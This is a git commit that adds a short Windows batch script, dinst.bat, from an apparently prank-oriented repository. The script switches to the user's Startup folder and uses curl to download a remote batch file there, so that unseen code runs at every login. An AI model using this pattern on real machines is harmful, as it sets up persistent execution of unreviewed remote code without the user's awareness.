3699f3dff9877131f5c6b7f5fe13d1ff31e3d07b
AvianJay <48914361+AvianJay@users.noreply.github.com>
2022-04-27 00:21:47 +0800

    d install

---
+++ dinst.bat
@@ -0,0 +1,3 @@
+@echo off
+cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+curl https://raw.githubusercontent.com/AvianJay/useless-win-batch/main/dredirect.bat --output dr.bat
